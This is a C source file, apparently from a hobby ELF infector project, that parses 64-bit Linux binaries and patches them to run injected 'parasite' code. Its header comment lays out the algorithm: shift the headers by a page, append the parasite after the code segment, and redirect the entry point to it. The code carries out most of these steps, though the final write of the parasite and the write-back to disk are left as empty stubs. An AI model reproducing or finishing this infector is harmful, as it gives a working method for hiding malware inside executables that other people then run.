// Author : Abhinav Thakur
// Email  : compilepeace@gmail.com

// Description : This module contains the miscellaneous routines


#include <stdio.h>
#include <string.h>
#include <elf.h>
#include <sys/mman.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>

#include "color.h"
#include "operations.h"



/*********************  ALGORITHM   *********************


--- ELF HEADER MODIFY
1.  Increase the e_shoff ( SHT offset in ELF header) by a PAGE_SIZE

	Patch parasite exit jmp address with value of e_entry (the original entry point of binary)


--- PHT MODIFY
2.  Find CODE Segment and increase -
        -> p_filesz
        -> p_memsz
	For all segments bellow CODE Segment, increase -
        -> p_offset
        -> p_vaddr
        -> p_paddr


--- SHT MODIFY
3.  Find the last section in CODE Segment and increase - 
        -> sh_size

	For all section headers(entries) after the last section of CODE Segment, increase - 
        -> sh_offset
        -> sh_addr


--- PARASITE INJECTION AFTER CODE SEGMENT END (i.e. just after the last section of CODE Segment)
4.  Physically insert the parasite code at CODE segment's end & pad to page size -
        ->  @ parasite_address = p_offset + p_filesz (original)         // (Code Segment's fields)

	Patch ELF Header's e_entry with parasite_address

*/




//	CRITICAL GLOBAL VARIABLES 


Elf64_Addr	entry_point_offset;
Elf64_Off	parasite_injection_offset = 0;

Elf64_Off	sht_offset,				// Offset (in file) to the start of Section Header Table
			pht_offset;				// Offset (in file) to the start of Program Header Table

uint16_t	pht_entry_count,		// Number of Entries(headers) in Program Header Table
			sht_entry_count;		// Number of Entries(headers) in Section Header Table
	
uint16_t	pht_entry_size,			// Size of 1 entry(header) in Program Header Table
			sht_entry_size;			// Size of 1 entry(header) in Section Header Table

uint64_t	sht_size,				// Size of SHT = no. of entries * size of 1 entry
			pht_size;				// Size of PHT = no. of entries * size of 1 entry

Elf64_Off   end_offset_of_elf;  	// Offset to end of elf (equivalent to size of file on disk)

uint64_t 	ehframe_section_size;		// Size of .eh_frame section in file
Elf64_Off	ehframe_section_offset;		// File offset of .eh_frame section



// file_size	is Size on file on disk
// image_size	is Size of file after being loaded into memory
void ElfParser(char *filepath)
{
	uint64_t	file_size;
	void 		*map_address;



	// Open the file
	int fd = open(filepath, O_RDWR);
		if (fd == -1) {
			perror(RED"[-]"RESET"elf.c - Infect() - open():");
			exit(0x60);
		}


	// Get the file_size using lstat()
	struct stat statbuf;
		if (lstat(filepath, &statbuf) != 0) {
			perror(RED"[-]"RESET"elf.c - Infect(), lstat():");
			exit(0x61);
		}
		file_size = statbuf.st_size;


	// Map the file into memory for instrumentation
	map_address = mmap(NULL, file_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
		if (map_address == MAP_FAILED) {
			perror("evil_elf.c - Infect(), mmap():");
			exit(0x62);
		}



	// -x-x-x-x-x-x-x-x-x-	STORE ORIGINAL INFORMATION before modifying ELF -x-x-x-x-x-x-x-x-x- 
		int ret;
		ret = ParseElfHeader( map_address );
			// skip Relocatable/Core type file
			// skip 32bit ELFCLASS binaries
			if (ret == 0x2 || ret == 0x3)	return;					


		// Load the offset and size of .eh_frame section (i.e. last section of code segment) 
		// (on disk representation) in the variables 'ehframe_section_offset' and 
		// 'ehframe_section_size' passed by reference to the function ParseSHT()
		ParseSHT( map_address, ".eh_frame", &ehframe_section_offset, &ehframe_section_size );


		printf("[DEBUG] .eh_frame section found @ offset : 0x%lx, size : 0x%lx\n", ehframe_section_offset, ehframe_section_size);


	// -x-x-x-x-x-x-x-x-x--x-x-x-x-x-x-x-x-x--x-x-x-x-x-x-x-x-x--x-x-x-x-x-x-x-x-x--x-x-x-x-x-



	// Start instrumenting
	ModifyMappedMemory( map_address );


	// Write mapped memory to file on disk


	printf("Unmapping %s!\n", filepath);
	munmap(map_address, file_size);
}



// Extracting usefull info. from binary (mapped @ map_addr) into global variables
int ParseElfHeader(void *map_addr)
{
	Elf64_Ehdr *binary_header = (Elf64_Ehdr *) map_addr;

	
	// ELF Type : Skip relocatable files and core files
	if ( binary_header->e_type == ET_REL ||
		 binary_header->e_type == ET_CORE ) return 0x2;

	
	// ELF CLASS : skip 32-bit class of binary
	if ( binary_header->e_ident[EI_CLASS] == ELFCLASS32 ) return 0x3;



	// Entry Point : store into global variable
	entry_point_offset = binary_header->e_entry;

	// SHT offset  : store into global variable
	sht_offset = binary_header->e_shoff;
	pht_offset = binary_header->e_phoff;

	pht_entry_count = binary_header->e_phnum;
	sht_entry_count = binary_header->e_shnum;

	pht_entry_size = binary_header->e_phentsize;
	sht_entry_size = binary_header->e_shentsize;	

	// Calculating SHT and PHT sizes = no. of entries(headers) * sizeof each entry(header)
	sht_size = sht_entry_count * sht_entry_size;
	pht_size = pht_entry_count * pht_entry_size;

}



// Function parses the SHT of the ELF binary mapped in memory @ 'map_addr' and finds the section name
// as described by string 'section' and sets the 'section_offset' and 'section_size' (by the section's
// offset and size as described by the ELF's SHT). These variables ('section_offset' and 
// 'section_size' is provided to the function by references (rather than by values).
void ParseSHT(void *map_addr, char *section, Elf64_Off *section_offset, uint64_t *section_size)
{
	
	end_offset_of_elf = (sht_offset + sht_size);
	

	// Point shdr (Pointer to iterate over SHT) to the last entry of SHT
	Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr +
												end_offset_of_elf -
												sht_entry_size);
	
	// .shstrtab section stores all section names (NULL terminated ASCII strings, back-to-back)
	char *shstrtab_section;



	// Parse the SHT bottom->up ( i.e. from last entry(.shstrtab) upto 2nd entry (after NULL entry)) 
	// This way we'll be able to identify .text section in one parse of SHT.
	int i;
	uint16_t SECTION_FOUND = 0;
	for ( i=0 ; i < (sht_entry_count-1) ; ++i )
	{
		// Name is in the form of an index of .shstrtab section
		Elf64_Off section_name_offset = section_entry->sh_name;


		// ASSUMPTION : Last entry is always .shstrtab section header !
		// Last entry is usually .shstrtab (through which we'll indirectly get the section names)
		if (i == 0)
		{
			// section_entry->offset tells at what offset is the current section is present in binary
			shstrtab_section = (char *)(map_addr + section_entry->sh_offset);
		}
		
		
		else {
			
			char *current_section_name = (char *) (shstrtab_section + section_name_offset);


			// While infecting sections, loop the entries from top->bottom and add this if statement
			// to increase the offset of the sections after .text
            //if (SECTION_FOUND == 1) printf("Fuck %s section\n", current_section_name);

			
			if ( strncmp(section, current_section_name, strlen(section) + 1) == 0 ) {

				SECTION_FOUND 	= 1;
				*section_offset	= section_entry->sh_offset;
				*section_size	= section_entry->sh_size; 
			}
		}	

		
		// Move to the next section entry
		--section_entry;
	}
}



// Find CODE Segment and modify fields according to the algorithm
void ParsePHT(void *map_addr)
{
	// Point to first entry in PHT
	Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(map_addr + pht_offset);

	
	// Parse PHT entries
	uint16_t CODE_SEGMENT_FOUND = 0;
	int i;
	for ( i = 0 ; i < pht_entry_count ; ++i)
	{
	
		// For all segments after CODE Segment  
        if (CODE_SEGMENT_FOUND == 1)
        {           
			
			// Increase p_offset, p_vaddr, p_addr
            phdr_entry->p_offset = phdr_entry->p_offset + PAGE_SIZE;
            phdr_entry->p_vaddr  = phdr_entry->p_vaddr  + PAGE_SIZE;
            phdr_entry->p_paddr  = phdr_entry->p_paddr  + PAGE_SIZE;
            
        }

	
		// Find the CODE Segment (containing .text section)
		if (phdr_entry->p_type == PT_LOAD && 
			phdr_entry->p_flags == (PF_R | PF_X) ) 
		{

			CODE_SEGMENT_FOUND = 1;


			// Save (p_offset + p_filesz) value for step - 4 of algorithm 
            parasite_injection_offset = phdr_entry->p_offset + phdr_entry->p_filesz;


			// Increase its p_filesz and p_memsz by a PAGE_SIZE
			phdr_entry->p_filesz = phdr_entry->p_filesz + PAGE_SIZE;
			phdr_entry->p_memsz  = phdr_entry->p_memsz  + PAGE_SIZE;

		}


		++phdr_entry;
	} 
}



// Modify the mapped binary (in memory)
static void ModifyMappedMemory(void *map_addr)
{

	// STEP - 1  : Increase the e_shoff by PAGE_SIZE
	Elf64_Ehdr *elf_header = (Elf64_Ehdr *) map_addr;
	elf_header->e_shoff = elf_header->e_shoff + PAGE_SIZE;

	
	// STEP - 2
	ParsePHT(map_addr); 


	// STEP - 3  : Incomplete
	//ParseSHT();


	// STEP - 4  : Inject Parasite code and patch ELF entry point with 'parasite_injection_offset' 
	elf_header->e_entry = parasite_injection_offset;
	InjectParasiteCode( map_addr, parasite_injection_offset );

}



// Inject parasite code at 'parasite_offset' inside mapped memory
static void InjectParasiteCode( void *map_addr, Elf64_Off parasite_offset)
{

	// Open parasite code
	int fd = open(parasite_path, O_RDONLY);
	if (fd == -1)
	{
		perror("In evil_elf - open():");
		exit(0x70);
	}


    // Get the file_size using lstat()
    struct stat statbuf;
        if (lstat(parasite_path, &statbuf) != 0) {
            perror(RED"[-]"RESET"evil_elf.c - InjectParasiteCode(), lstat():");
            exit(0x61);
        }


	uint64_t parasite_size = statbuf.st_size;
	uint8_t *parasite_code = (uint8_t *)malloc(parasite_size);
	if (parasite_code == NULL)
	{
		perror("evil_elf.c, InjectParasiteCode() : Out of memory\n");
		exit(0x61);
	}


	printf("Parasite size : %ld\n", parasite_size);

	// read parasite code from file into memory
	int bytes_read = read(fd, (void *)parasite_code, parasite_size);
	if (bytes_read != parasite_size)
	{
		fprintf(stderr, "evil_elf.c - InjectParasiteCode() : while reading parasite_code\n");
		exit(0x62);
	}


	// Before writing parasite_code to mapped memory, modify its jmp exit address with original 
	// entry point of the binary being instrumented
	

	// write parasite code to parasite_offset


	// Free the allocated memory on heap
	free(parasite_code);
}




